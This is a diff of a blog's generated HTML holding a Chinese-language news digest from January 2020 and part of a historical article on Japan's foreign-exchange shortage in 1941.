+<p>欧盟(EU)贸易专员菲尔•霍根(Phil Hogan)批评美中“第一阶段”贸易协议提供的经济利益有限，暗示这主要是唐纳德•特朗普(Donald Trump)为赢得连任而采取的政治行动 ... 此外，一些国家担心，作为协议的一部分，中国采购2000亿美元美国商品，将使世界两个最大经济体之间展开“管理贸易”，这可能会无视市场力量、对两国企业不利、违反世界贸易组织(WTO)的承诺。<a href="http://www.ftchinese.com/story/001085983" target="_blank" rel="noopener">source</a></p>
+<h2 data-number="1.2" id="中国经济数据"><span class="header-section-number">1.2</span> 2019 中国经济数据</h2>
+<h2 data-number="1.3" id="俄罗斯政府宣布全体辞职"><span class="header-section-number">1.3</span> <a href="https://www.dw.com/zh/%E4%BF%84%E6%94%BF%E5%BA%9C%E5%AE%A3%E5%B8%83%E5%85%A8%E4%BD%93%E8%BE%9E%E8%81%8C/a-52013402" target="_blank" rel="noopener">俄罗斯政府宣布全体辞职</a></h2>
+<p>据俄罗斯通讯社报道，在普京总统发表年度国情咨文后，俄罗斯总理梅德韦杰夫宣布俄政府全体辞职。梅德韦杰夫表示，在俄罗斯总统普京宣布一系列宪法修改意见后，他告知普京，俄罗斯政府决定全体辞职。梅德韦杰夫说，普京总统的建议将对国家权力的平衡带来显著变化，政府以现在的形式辞职，以便总统可以采取所有必要措施。</p>
+<p>俄罗斯国际文传通讯社援引梅德韦杰夫报道，普京将提名新的政府，并指示现内阁在此之前继续留任。该通讯社还报道，普京将任命梅德韦杰夫为俄罗斯联邦安全会议副主席，负责国防和安全。</p>
+<p>1月15日早些时候，普京在国情咨文讲话中宣布，将在宪法改革中赋予议会更大的权力。议会今后将决定政府首脑以及重要的内阁成员。</p>
+<blockquote>
+<p>李建秋在之前的一篇文章里面就提到了梅德韦杰夫的问题。梅德韦杰夫作为自由派，在很多问题上优柔寡断，损害了俄罗斯的利益，下台是必然的。</p>
+</blockquote>
+<p>克里姆林宫表示，俄罗斯总统普京周三正式提名名不见经传的俄罗斯联邦税务局局长Mikhail Mishustin担任新总理。<a href="https://cn.reuters.com/article/russia-putin-mishustin-new-pm-0115-idCNKBS1ZE30K?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></p>
+<h2 data-number="1.4" id="美军多人在伊朗导弹袭击中受伤"><span class="header-section-number">1.4</span> 美军多人在伊朗导弹袭击中受伤</h2>
+<p>1 月 8 日，伊朗为报复美国无人机袭击炸死圣城旅最高领导人苏莱曼尼准将，向美军在伊拉克的若干军事基地发动了导弹袭击。随后美国总统特朗普表示伊朗的导弹袭击没有导致任何美国人的伤亡，中东局势随之降温。不过近日新的消息显示，大约有 11 名美国士兵在伊朗的导弹袭击中受伤。<a href="https://www.reuters.com/article/us-iraq-security-usa-casualties/eleven-u-s-troops-injured-in-jan-8-iran-missile-attack-in-iraq-idUSKBN1ZG0AX" target="_blank" rel="noopener">source</a></p>
+<h2 data-number="1.5" id="其他"><span class="header-section-number">1.5</span> 其他</h2>
+<h3 data-number="1.5.1" id="国内"><span class="header-section-number">1.5.1</span> 国内</h3>
+<ul>
+<li>武汉发现的新型冠状病毒有人传人的风险，已向全球医院发出警告。<a href="https://cn.reuters.com/article/china-health-concern-who-0114-tues-idCNKBS1ZE01J?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></li>
+<li>2019 年中国汽车的销量下降了 8.2%，至 2580 万辆。<a href="http://www.ftchinese.com/story/001085908" target="_blank" rel="noopener">source</a></li>
+<li>中国海关总署发布数据，2019年，中美两国贸易额为5412.23亿美元，同比下降14.6%。<a href="http://sputniknews.cn/economics/202001141030443429/" target="_blank" rel="noopener">source</a></li>
+<li>1 月 16 日，著名主持人赵忠祥去世。<a href="https://www.zhihu.com/question/366508914" target="_blank" rel="noopener">source</a></li>
+<li>1 月 16 日，首家纯外资保险公司 安联中国在上海正式开业。</li>
+<li>支持反送中的香港民间组织「国难中医」创建人被指在广州嫖娼被捕。这位化名”肥仔“的香港学生就读于广州中医药大学，“国难忠医”为一个志愿医务人员网。<a href="https://www.dw.com/zh/香港-国难忠医-创建人被指在广州嫖娼被捕/a-52031133?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li>
+<li>大陆总人口突破 14 亿人。国家统计局数据显示，截至2019年末，中国大陆总人口突破14亿人，为140005万人，比上年末增长467万人。</li>
+<li>国家统计局 1 月 17 日对外宣布，经过初步核算，2019 年我国国内生产总值 (GDP) 为 99.0865万亿元，稳居世界第二位；人均GDP首次站上1万美元的新台阶。此前，全球人均GDP超过1万美元的经济体总人口近15亿。中国人均GDP突破1万美元，相当于人均GDP超过1万美元的世界人口翻了一番。</li>
+<li>一名女子在社交媒体上晒出了自己驾驶豪华越野车进入紫禁城的照片，在中国引发轩然大波。故宫博物院周五（1月17日）连夜致歉。<a href="http://www.bbc.com/zhongwen/simp/chinese-news-51159468" target="_blank" rel="noopener">source</a>, <a href="https://zh.wikipedia.org/wiki/%E5%A5%B3%E5%AD%90%E5%BC%80%E8%BD%A6%E8%BF%9B%E6%95%85%E5%AE%AB%E4%BA%8B%E4%BB%B6" target="_blank" rel="noopener">source: Wiki</a>,</li>
+</ul>
+<h3 data-number="1.5.2" id="国际"><span class="header-section-number">1.5.2</span> 国际</h3>
+<ul>
+<li>乌克兰客机遇害者所属国家将在伦敦开会讨论对伊朗此案去法律行动。<a href="https://cn.reuters.com/article/iran-crash-ukraine-exclusive-0113-mon-idCNKBS1ZD015?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></li>
+<li>本周中美将签订贸易协议，在签订之前，美国财务部将摘掉中国汇率操纵国的标签。特朗普政府的一位官员暗示美方将采取上述行动。此举将逆转去年夏天美国政府将中国列为汇率操纵国的有争议决定；当时华盛顿和北京之间的紧张关系急剧升级。<a href="http://www.ftchinese.com/story/001085909" target="_blank" rel="noopener">source</a></li>
+<li>位于拉合尔的巴基斯坦最高法院裁定审理前总统<a href="https://zh.wikipedia.org/zh-hans/%E4%BD%A9%E5%B0%94%E9%9F%A6%E5%85%B9%C2%B7%E7%A9%86%E6%B2%99%E6%8B%89%E5%A4%AB" target="_blank" rel="noopener">穆沙拉夫</a>的特别法院违宪，后者被判处死刑。<a href="http://sputniknews.cn/politics/202001141030442655/" target="_blank" rel="noopener">source</a></li>
+<li>英国首相鲍里斯·约翰逊14日明确拒绝苏格兰要求于今年举行二次独立公投的要求，称二次公投会让苏格兰再度陷入政治僵局。<a href="http://www.bjd.com.cn/a/202001/15/WS5e1e8937e4b0e6e583938c98.html" target="_blank" rel="noopener">source</a></li>
+<li>在武汉发现的不明肺炎在泰国曼谷发现首例境外感染者。<a href="http://www.bbc.com/zhongwen/simp/world-51116985" target="_blank" rel="noopener">source</a></li>
+<li>日本厚生劳动省对外通报，日本国内发现首例感染新型病毒的肺炎患者病例。患者是一位居住在日本、此前曾前往过武汉的中国籍男子。<a href="https://www.dw.com/zh/日本现首例新型冠状病毒肺炎/a-52020515?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li>
+<li>丹麦地标小美人鱼像被喷上 Free Hong Kong 的口号。该雕像过往曾多次被涂鸦及损毁，更在1964年及1998年两次被“斩首”。<a href="http://www.bbc.com/zhongwen/simp/world-51116225" target="_blank" rel="noopener">source</a></li>
+<li>据俄罗斯卫星网1月16日报道，车臣总统和政府网站上发布的命令称，车臣领导人拉姆赞·卡德罗夫13日签署文件任命车臣政府总理穆斯利姆·胡奇耶夫自1月13日起在他暂时丧失工作能力期间临时行使领导人职权。</li>
+<li>美国要求台积电在大选前做好决定，是否前往美国生产芯片。</li>
+<li>土耳其总统埃尔多安当地时间16日宣布，将开始向利比亚部署军队以支持“民族团结政府”并维护地区稳定。《卫报》援引消息人士称，土耳其已经或即将向利比亚派出2000名来自叙利亚的反政府武装分子，但这一说法未获证实。<a href="https://www.guancha.cn/internation/2020_01_17_531922.shtml" target="_blank" rel="noopener">source</a></li>
+<li>土耳其解除对维基百科的屏蔽。在近一千天后，在宪法法院裁决屏蔽违法之后，土耳其解除了对维基百科的封锁。因为拒绝删除批评政府的文章，土耳其在 2017 年 4 月命令 ISP 屏蔽了维基百科。这一封锁共持续了 991 天。维基基金会对解除封锁表达了欢迎。对维基百科的解封不是一下子实现的，而是“逐步”，部分 ISP 还在处理之中。<a href="https://t.me/solidot/9931" target="_blank" rel="noopener">source: Solidot</a></li>
+<li>习近平出访缅甸，这是中国最高领导人19年来首次访问缅甸。其中一项重要目标，便是推进中国在印度洋的门户皎漂港的项目。<a href="http://www.bbc.com/zhongwen/simp/chinese-news-51146741" target="_blank" rel="noopener">source: BBC</a>, <a href="https://www.dw.com/zh/习近平抵达缅甸：官方热烈欢迎-民间担忧加剧/a-52044385?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source2: DW</a></li>
+<li>英国宣布 31 日的脱欧大庆计划，其中包括上演灯光秀和发行纪念币。。<a href="https://www.dw.com/zh/英国宣布脱欧大庆计划/a-52053130?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source: DW</a></li>
+<li>默克尔表示，德国这样的开放国家，不应将华为这样的个别公司拒之门外，而且没有华为，德国5G网络建设也会受到威胁。如今，联邦内政部长也做出了类似的表态。<a href="https://www.dw.com/zh/德内政部长力挺华为参与德国5g扩建/a-52051010?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source: DW</a></li>
+</ul>
+<h3 data-number="1.5.3" id="科技"><span class="header-section-number">1.5.3</span> 科技</h3>
+<ul>
+<li>Google 将淘汰第三方Cookie。<a href="http://www.ftchinese.com/story/001085945" target="_blank" rel="noopener">source</a></li>
+<li>微软正式终止支持 Windows 7。<a href="https://www.williamlong.info/archives/5949.html" target="_blank" rel="noopener">source</a></li>
+<li>微软正式发布基于 Chromium 的浏览器 the New Microsoft Edge。拥有更快的速度、更低的内存占用，更多的隐私选项，支持 Windows 7、8、8.1、10 和 macOS，支持全部现有的 Chrome 扩展。<a href="https://www.appinn.com/the-new-microsoft-edge-base-chromium/" target="_blank" rel="noopener">source</a></li>
+<li>Sony 计划向 PC 移植其独占游戏作品。<a href="https://t.me/solidot/9937" target="_blank" rel="noopener">source: Solidot</a></li>
+<li>Google 的母公司 Alphabet 股票市场首次突破 1 万亿美元，成为第四家跨越这一门槛的美国科技企业。<a href="http://www.ftchinese.com/story/001085991" target="_blank" rel="noopener">source: FT</a></li>
+<li>中科院计算所团队推出“完全自主设计、开发和实现”的“木兰”编程语言，很多开发者发现解包后的木兰语言其实就是建立在 Python 之上，将 Python 构建的环境、包和项目都编译成一个可执行文件。似乎木兰只是在顶层做了一个接口，将底层编译、优化等众多工作都交给了原版 Python。“木兰”编程语言是Python语言的套壳产品。<a href="https://www.williamlong.info/archives/5952.html" target="_blank" rel="noopener">source</a>。</li>
+</ul>
+<h1 data-number="2" id="言论"><span class="header-section-number">2</span> 言论</h1>
+<ul>
+<li><p>如果还没想清楚，就用蛮力算法。 —— Ken Thompson</p></li>
+<li><p>不要使用反正弦和反余弦函数——你总能用优美的恒等式，或者是计算向量点积来更好地解决问题。—— Jim Conyngha</p></li>
+<li><p>在存储日期中的年份的时候，请使用四位数字。—— David Martin</p></li>
+<li><p>避免使用不对称结构。—— Andy Huber</p></li>
+<li><p>代码写的越急，程序跑得越慢。—— Roy Carlson</p></li>
+<li><p>你用英语都写不出来的东西就别指望用代码写了。—— Peter Halpern</p></li>
+<li><p>如果代码和注释不一致，那很可能两者都错了。—— Norm Schryer</p></li>
+<li><p>如果你发现特殊情况太多，那你肯定是用错方法了。—— Carig Zerouni</p></li>
+<li><p>先把数据结构搞清楚，程序的其余部分自现。—— David Jones</p></li>
+<li><p>I don't care who does the electing, so long as I get to do the nominating. - <a href="https://en.wikiquote.org/wiki/William_M._Tweed" target="_blank" rel="noopener">William M. Tweed</a></p></li>
+</ul>
+<h1 data-number="3" id="文章"><span class="header-section-number">3</span> 文章</h1>
+<ul>
+<li><a href="https://www.bbc.com/future/article/20170607-why-printers-add-secret-tracking-dots" target="_blank" rel="noopener">Why printers add secret tracking dots</a>。彩色打印机厂商会在页面上添加隐形标志，但是从不对外界透露。</li>
+<li><a href="https://www.vinaysahni.com/best-practices-for-a-pragmatic-restful-api" target="_blank" rel="noopener">RESTful API 最佳实践</a></li>
+</ul>
 
-### 中美签署贸易战第一阶段协议
-
-这意味着近两年来拖累全球经济的贸易战暂告一个段落，而美国对大部分中国输美商品加征的关税则维持不变。周三在白宫签署所谓的第一阶段协议之前，漫长的美中经贸冲突曾引发全球市场焦虑，并给企业带来不确定性。
-
-协议全文 94 页（[中](http://103.78.124.74:81/2Q2W191F46ABF384979D28B01DEDE17C6AF9E671666B_unknown_4F327C5A68A8BAAC21C97C814446427060F434D5_4/images.mofcom.gov.cn/www/202001/20200116104122611.pdf)，[英](https://assets.bwbx.io/documents/users/iqjWHBFdfxIU/rVaHxDBUtdew/v0)），一些重点：
-
-- 前 16 页详细规定了保护知识产权的力度，对窃取商业机密行为作出刑事处罚。中国将在签署后 30 工作日内公布“增强知识产权保护的行动方案，以支持其高质量增长”。
-- 双方不得以市场准入相关门槛、合营并购等投资行为，强迫另外一方转让技术。
-- 2020-2021 年两年间，中国将从美国增加采购 2000 亿美元商品，包括 777 亿美元制造业商品、320 亿美元农产品、524 亿美元能源产品、379 亿美元服务业产品。增加是指在 2017 年贸易战爆发前基础上增加。
-- 双方互加关税没有消除。去年年底宣布达成协议时暂停增加的[惩罚性关税](https://www.qdaily.com/articles/64246.html)将继续暂停下去——-原定 12 月 15 日，美国对 1600 亿美元中国产手机、电脑、玩具等商品增加关税、中国对美国产汽车等商品增加关税。此外美国自 9 月 1 日起对 1200 亿中国商品加税幅度减半至 7.5%。但大部分已经执行的加税（美对中 2500 亿、中对美 1100 亿）没有取消。
-
-协议覆盖了一些已经在早先宣布的内容，比如双方遵循 G20 期间宣布的不以价格竞争为目的而贬值货币的承诺、中国对外开放银行、保险、资产管理等金融市场。
-
-特朗普现场称关税问题可以在第二阶段协议里一次性解决。刘鹤现场宣读中国国家主席习近平的信，敦促美国公平对待中国公司、保护双方大学等机构的持续合作。签约仪式和双方演讲有[全程直播](https://www.youtube.com/watch?v=3jA4rgUHgqA)。
-
-欧盟(EU)贸易专员菲尔•霍根(Phil Hogan)批评美中“第一阶段”贸易协议提供的经济利益有限，暗示这主要是唐纳德•特朗普(Donald Trump)为赢得连任而采取的政治行动 ... 此外，一些国家担心，作为协议的一部分，中国采购2000亿美元美国商品，将使世界两个最大经济体之间展开“管理贸易”，这可能会无视市场力量、对两国企业不利、违反世界贸易组织(WTO)的承诺。[source](http://www.ftchinese.com/story/001085983)
-
-### 2019 中国经济数据
-
-### [俄罗斯政府宣布全体辞职](https://www.dw.com/zh/%E4%BF%84%E6%94%BF%E5%BA%9C%E5%AE%A3%E5%B8%83%E5%85%A8%E4%BD%93%E8%BE%9E%E8%81%8C/a-52013402)
-
-据俄罗斯通讯社报道，在普京总统发表年度国情咨文后，俄罗斯总理梅德韦杰夫宣布俄政府全体辞职。梅德韦杰夫表示，在俄罗斯总统普京宣布一系列宪法修改意见后，他告知普京，俄罗斯政府决定全体辞职。梅德韦杰夫说，普京总统的建议将对国家权力的平衡带来显著变化，政府以现在的形式辞职，以便总统可以采取所有必要措施。
-
-俄罗斯国际文传通讯社援引梅德韦杰夫报道，普京将提名新的政府，并指示现内阁在此之前继续留任。该通讯社还报道，普京将任命梅德韦杰夫为俄罗斯联邦安全会议副主席，负责国防和安全。
-
-1月15日早些时候，普京在国情咨文讲话中宣布，将在宪法改革中赋予议会更大的权力。议会今后将决定政府首脑以及重要的内阁成员。
-
-> 李建秋在之前的一篇文章里面就提到了梅德韦杰夫的问题。梅德韦杰夫作为自由派，在很多问题上优柔寡断，损害了俄罗斯的利益，下台是必然的。
-
-克里姆林宫表示，俄罗斯总统普京周三正式提名名不见经传的俄罗斯联邦税务局局长Mikhail Mishustin担任新总理。[source](https://cn.reuters.com/article/russia-putin-mishustin-new-pm-0115-idCNKBS1ZE30K?feedType=RSS&feedName=CNTopGenNews)
-
-### 美军多人在伊朗导弹袭击中受伤
-
-1 月 8 日，伊朗为报复美国无人机袭击炸死圣城旅最高领导人苏莱曼尼准将，向美军在伊拉克的若干军事基地发动了导弹袭击。随后美国总统特朗普表示伊朗的导弹袭击没有导致任何美国人的伤亡，中东局势随之降温。不过近日新的消息显示，大约有 11 名美国士兵在伊朗的导弹袭击中受伤。[source](https://www.reuters.com/article/us-iraq-security-usa-casualties/eleven-u-s-troops-injured-in-jan-8-iran-missile-attack-in-iraq-idUSKBN1ZG0AX)
-
-### 其他
-
-#### 国内
-
-- 武汉发现的新型冠状病毒有人传人的风险，已向全球医院发出警告。[source](https://cn.reuters.com/article/china-health-concern-who-0114-tues-idCNKBS1ZE01J?feedType=RSS&feedName=CNTopGenNews)
-- 2019 年中国汽车的销量下降了 8.2%，至 2580 万辆。[source](http://www.ftchinese.com/story/001085908)
-- 中国海关总署发布数据，2019年，中美两国贸易额为5412.23亿美元，同比下降14.6%。[source](http://sputniknews.cn/economics/202001141030443429/)
-- 1 月 16 日，著名主持人赵忠祥去世。[source](https://www.zhihu.com/question/366508914)
-- 1 月 16 日，首家纯外资保险公司 安联中国在上海正式开业。
-- 支持反送中的香港民间组织「国难中医」创建人被指在广州嫖娼被捕。这位化名”肥仔“的香港学生就读于广州中医药大学，“国难忠医”为一个志愿医务人员网。[source](https://www.dw.com/zh/香港-国难忠医-创建人被指在广州嫖娼被捕/a-52031133?maca=chi-rss-chi-all-1127-rdf)
-- 大陆总人口突破 14 亿人。国家统计局数据显示，截至2019年末，中国大陆总人口突破14亿人，为140005万人，比上年末增长467万人。
-- 国家统计局 1 月 17 日对外宣布，经过初步核算，2019 年我国国内生产总值 (GDP) 为 99.0865万亿元，稳居世界第二位；人均GDP首次站上1万美元的新台阶。此前，全球人均GDP超过1万美元的经济体总人口近15亿。中国人均GDP突破1万美元，相当于人均GDP超过1万美元的世界人口翻了一番。
-- 一名女子在社交媒体上晒出了自己驾驶豪华越野车进入紫禁城的照片，在中国引发轩然大波。故宫博物院周五（1月17日）连夜致歉。[source](http://www.bbc.com/zhongwen/simp/chinese-news-51159468), [source: Wiki](https://zh.wikipedia.org/wiki/%E5%A5%B3%E5%AD%90%E5%BC%80%E8%BD%A6%E8%BF%9B%E6%95%85%E5%AE%AB%E4%BA%8B%E4%BB%B6), 
-
-#### 国际
-
-- 乌克兰客机遇害者所属国家将在伦敦开会讨论对伊朗此案去法律行动。[source](https://cn.reuters.com/article/iran-crash-ukraine-exclusive-0113-mon-idCNKBS1ZD015?feedType=RSS&feedName=CNTopGenNews)
-- 本周中美将签订贸易协议，在签订之前，美国财务部将摘掉中国汇率操纵国的标签。特朗普政府的一位官员暗示美方将采取上述行动。此举将逆转去年夏天美国政府将中国列为汇率操纵国的有争议决定；当时华盛顿和北京之间的紧张关系急剧升级。[source](http://www.ftchinese.com/story/001085909)
-- 位于拉合尔的巴基斯坦最高法院裁定审理前总统[穆沙拉夫](https://zh.wikipedia.org/zh-hans/%E4%BD%A9%E5%B0%94%E9%9F%A6%E5%85%B9%C2%B7%E7%A9%86%E6%B2%99%E6%8B%89%E5%A4%AB)的特别法院违宪，后者被判处死刑。[source](http://sputniknews.cn/politics/202001141030442655/)
-- 英国首相鲍里斯·约翰逊14日明确拒绝苏格兰要求于今年举行二次独立公投的要求，称二次公投会让苏格兰再度陷入政治僵局。[source](http://www.bjd.com.cn/a/202001/15/WS5e1e8937e4b0e6e583938c98.html)
-- 在武汉发现的不明肺炎在泰国曼谷发现首例境外感染者。[source](http://www.bbc.com/zhongwen/simp/world-51116985)
-- 日本厚生劳动省对外通报，日本国内发现首例感染新型病毒的肺炎患者病例。患者是一位居住在日本、此前曾前往过武汉的中国籍男子。[source](https://www.dw.com/zh/日本现首例新型冠状病毒肺炎/a-52020515?maca=chi-rss-chi-all-1127-rdf)
-- 丹麦地标小美人鱼像被喷上 Free Hong Kong 的口号。该雕像过往曾多次被涂鸦及损毁，更在1964年及1998年两次被“斩首”。[source](http://www.bbc.com/zhongwen/simp/world-51116225)
-- 据俄罗斯卫星网1月16日报道，车臣总统和政府网站上发布的命令称，车臣领导人拉姆赞·卡德罗夫13日签署文件任命车臣政府总理穆斯利姆·胡奇耶夫自1月13日起在他暂时丧失工作能力期间临时行使领导人职权。
-- 美国要求台积电在大选前做好决定，是否前往美国生产芯片。
-- 土耳其总统埃尔多安当地时间16日宣布，将开始向利比亚部署军队以支持“民族团结政府”并维护地区稳定。《卫报》援引消息人士称，土耳其已经或即将向利比亚派出2000名来自叙利亚的反政府武装分子，但这一说法未获证实。[source](https://www.guancha.cn/internation/2020_01_17_531922.shtml)
-- 土耳其解除对维基百科的屏蔽。在近一千天后，在宪法法院裁决屏蔽违法之后，土耳其解除了对维基百科的封锁。因为拒绝删除批评政府的文章，土耳其在 2017 年 4 月命令 ISP 屏蔽了维基百科。这一封锁共持续了 991 天。维基基金会对解除封锁表达了欢迎。对维基百科的解封不是一下子实现的，而是“逐步”，部分 ISP 还在处理之中。[source: Solidot](https://t.me/solidot/9931)
-- 习近平出访缅甸，这是中国最高领导人19年来首次访问缅甸。其中一项重要目标，便是推进中国在印度洋的门户皎漂港的项目。[source: BBC](http://www.bbc.com/zhongwen/simp/chinese-news-51146741), [source2: DW](https://www.dw.com/zh/习近平抵达缅甸：官方热烈欢迎-民间担忧加剧/a-52044385?maca=chi-rss-chi-all-1127-rdf)
-- 英国宣布 31 日的脱欧大庆计划，其中包括上演灯光秀和发行纪念币。。[source: DW](https://www.dw.com/zh/英国宣布脱欧大庆计划/a-52053130?maca=chi-rss-chi-all-1127-rdf)
-- 默克尔表示，德国这样的开放国家，不应将华为这样的个别公司拒之门外，而且没有华为，德国5G网络建设也会受到威胁。如今，联邦内政部长也做出了类似的表态。[source: DW](https://www.dw.com/zh/德内政部长力挺华为参与德国5g扩建/a-52051010?maca=chi-rss-chi-all-1127-rdf)
-
-#### 科技
-
-- Google 将淘汰第三方Cookie。[source](http://www.ftchinese.com/story/001085945)
-- 微软正式终止支持 Windows 7。[source](https://www.williamlong.info/archives/5949.html)
-- 微软正式发布基于 Chromium 的浏览器 the New Microsoft Edge。拥有更快的速度、更低的内存占用，更多的隐私选项，支持 Windows 7、8、8.1、10 和 macOS，支持全部现有的 Chrome 扩展。[source](https://www.appinn.com/the-new-microsoft-edge-base-chromium/)
-- Sony 计划向 PC 移植其独占游戏作品。[source: Solidot](https://t.me/solidot/9937)
-- Google 的母公司 Alphabet 股票市场首次突破 1 万亿美元，成为第四家跨越这一门槛的美国科技企业。[source: FT](http://www.ftchinese.com/story/001085991)
-- 中科院计算所团队推出“完全自主设计、开发和实现”的“木兰”编程语言，很多开发者发现解包后的木兰语言其实就是建立在 Python 之上，将 Python 构建的环境、包和项目都编译成一个可执行文件。似乎木兰只是在顶层做了一个接口，将底层编译、优化等众多工作都交给了原版 Python。“木兰”编程语言是Python语言的套壳产品。[source](https://www.williamlong.info/archives/5952.html)。
-
-## 言论
-
-- 如果还没想清楚，就用蛮力算法。 —— Ken Thompson
-- 不要使用反正弦和反余弦函数——你总能用优美的恒等式，或者是计算向量点积来更好地解决问题。—— Jim Conyngha
-- 在存储日期中的年份的时候，请使用四位数字。—— David Martin
-- 避免使用不对称结构。—— Andy Huber
-- 代码写的越急，程序跑得越慢。—— Roy Carlson
-- 你用英语都写不出来的东西就别指望用代码写了。—— Peter Halpern
-- 如果代码和注释不一致，那很可能两者都错了。—— Norm Schryer
-- 如果你发现特殊情况太多，那你肯定是用错方法了。—— Carig Zerouni
-- 先把数据结构搞清楚，程序的其余部分自现。—— David Jones
-
-- I don't care who does the electing, so long as I get to do the nominating. - [William M. Tweed](https://en.wikiquote.org/wiki/William_M._Tweed)
-
-## 文章
-
-- [Why printers add secret tracking dots](https://www.bbc.com/future/article/20170607-why-printers-add-secret-tracking-dots)。彩色打印机厂商会在页面上添加隐形标志，但是从不对外界透露。
-- [RESTful API 最佳实践](https://www.vinaysahni.com/best-practices-for-a-pragmatic-restful-api)
           
         
       
@@ -2267,7 +2137,7 @@ $$
 
       
         
-          ![](https://imgs.codewoody.com/uploads/big/93b05a2c7a9935cc6df5ce26784451fc.jpg)
+          <p><img src="https://imgs.codewoody.com/uploads/big/93b05a2c7a9935cc6df5ce26784451fc.jpg"></p>
           <!--noindex-->
           
             <div class="post-button text-center">
@@ -2442,34 +2312,28 @@ $$
       
         
           
-            
-在日本偷袭珍珠港事件以前，日本大量从美国尽快必要的战争物资，尤其是石油。在珍珠港事件之前，美国开始执行对日本的物资禁运。很多人因此认为，如果日本不去作这个死，集中全力去解决中国问题，那么抗战胜负，未可知也。
-
-但大多数普通人不知道的是，事实上到 1941 年日本的外汇储备已经枯竭。也就是说，即便美国不去制裁日本，日本也不会有钱去找美国购买至关重要的战略物资（如石油，橡胶等）。在这种情况下，日本铤而走险，抢占法国、荷兰在东南亚的殖民地以获取战略物资（例如法属印度支那的橡胶和婆罗洲的油田，还包括粮食、铁、有色金属等）就成了无可奈何的必然选择。日本的外汇枯竭，事实上是日本侵略中国导致国力日渐枯竭的后果。这篇文章主要就这一问题进行考证。
-
-## 外汇枯竭
-
-知乎上一个[高赞回答](https://www.zhihu.com/question/284203566)提到了这个问题。
-
-> 其实原因很明显：日本侵华亏惨了老本，经济濒临崩溃，购买石油、粮食等战略物资的能力已近于枯竭，到1941年，按美国驻日大使的说法，日本可用于支付的外汇只相当于2万德国马克。（约瑟夫。C。格鲁《使日十年》）
-
-> 在中文网络上，搜索关于1941年日本外汇储备的情况也几乎都能追溯到这个引用。不过这个引用细究一下有点奇怪。作者约瑟夫·C·格鲁是美国驻日大使，日本政府的财政状况，他何以清楚呢？毕竟当年不是现在，日本政府、军部应该不会定期公开发布全面的财政报告。
-
-[《使日十年》(<i>Ten Years in Japan</i>)](https://book.douban.com/subject/1479333/)，是 1932 年至 1942 年间担任美国驻日大使[约瑟夫-C-格鲁(Joseph Clark Grew)](https://zh.wikipedia.org/wiki/%E7%BA%A6%E7%91%9F%E5%A4%AB%C2%B7%E6%A0%BC%E9%B2%81)的日记及公私文件摘录。该书的英文原版可以在[这个链接](https://archive.org/details/TenYearsInJapan/page/n327)查看。在该链接中，[第399页](https://archive.org/details/TenYearsInJapan/page/n399)，章节 Frozen credits bring japan close to bankruptcy写道:
-
-> October 9, 1941
->
-> According to information received by a member of my staff from what is regarded as a very reliable source, **the amount of foreign exchange available to the Japanese Government now is approximately 20,000 reichsmarks**, and under the circumstances the Japanese Government will be unable to avoid defaulting on contracts calling for foreign exchange on maturity. The freezing regulations which were put into effect by the United States, Great Britain, and the Netherlands East Indies have completely cut off any exchange transactions in the currencies of those countries, and in addition have greatly reduced transactions in the currencies of South American countries. According to this information, his own contracts involve foreign exchange totalling approximately five million Swedish kronen, and during recent months Japanese purchases of Swedish goods have been primarily financed through Berlin, persumably through German advanced credits.
->
-> The Japanese have been informed recently by the Germans that these credits are now frozen and are to used only to purchase of German goods. According to our informant it is possible that this action by the Germans was taken in anticipation of Japan's withdrawal from the Axis. According to another soure it is believed that since Sweden is heavily indebted to Germany for armaments, the Germans are now demanding in return from Sweden goods instead of Swedish kronen. Reports are current here that Japan is now eighty million marks in debt to Germany.
->
-> In actual fact Japan is now in virtually the same embarrassing position from the point of view of international finance as are designated foreigners in this country.
-
-这里，作者直接提到了，根据十分可靠的信息来源，日本政府的外汇储备大约是两万德国马克，日本将无力支付外汇合同。由美国，英国和荷兰东印度公司联合制定的冻结条款阻止了日本获得这些国家的货币储备，同时也削弱了日本和南美国家的交易。近几个月以来，日本和瑞士方面的价值五百万瑞士克朗的订单主要在依靠德国的贷款进行支付。不过近期德国告知日本方面日本的贷款也被冻结，而且贷款只能用于从德国购买商品。目前日本已经欠了德国大约八百万马克。这意味着日本的财政即将崩溃。
-
-一些其他有意思的发现（下面的页码都是前面给出的英文原版链接中的页码）：
-
-1. 第 326 页: 1941 年，大使已经听到了很多谈论日本将会对珍珠港发动大规模的突然袭击的说法，并且报告了政府。原文是: <i>There is a lot of talk around town to the effect that the Japanese, in case of a break with the United States, are planning to go all out in a surprise attack on Pearl Harbour. Of course I informed our Government.</i>
+            <p>在日本偷袭珍珠港事件以前，日本大量从美国尽快必要的战争物资，尤其是石油。在珍珠港事件之前，美国开始执行对日本的物资禁运。很多人因此认为，如果日本不去作这个死，集中全力去解决中国问题，那么抗战胜负，未可知也。</p>
+<p>但大多数普通人不知道的是，事实上到 1941 年日本的外汇储备已经枯竭。也就是说，即便美国不去制裁日本，日本也不会有钱去找美国购买至关重要的战略物资（如石油，橡胶等）。在这种情况下，日本铤而走险，抢占法国、荷兰在东南亚的殖民地以获取战略物资（例如法属印度支那的橡胶和婆罗洲的油田，还包括粮食、铁、有色金属等）就成了无可奈何的必然选择。日本的外汇枯竭，事实上是日本侵略中国导致国力日渐枯竭的后果。这篇文章主要就这一问题进行考证。</p>
+<h1 data-number="1" id="外汇枯竭"><span class="header-section-number">1</span> 外汇枯竭</h1>
+<p>知乎上一个<a href="https://www.zhihu.com/question/284203566" target="_blank" rel="noopener">高赞回答</a>提到了这个问题。</p>
+<blockquote>
+<p>其实原因很明显：日本侵华亏惨了老本，经济濒临崩溃，购买石油、粮食等战略物资的能力已近于枯竭，到1941年，按美国驻日大使的说法，日本可用于支付的外汇只相当于2万德国马克。（约瑟夫。C。格鲁《使日十年》）</p>
+</blockquote>
+<blockquote>
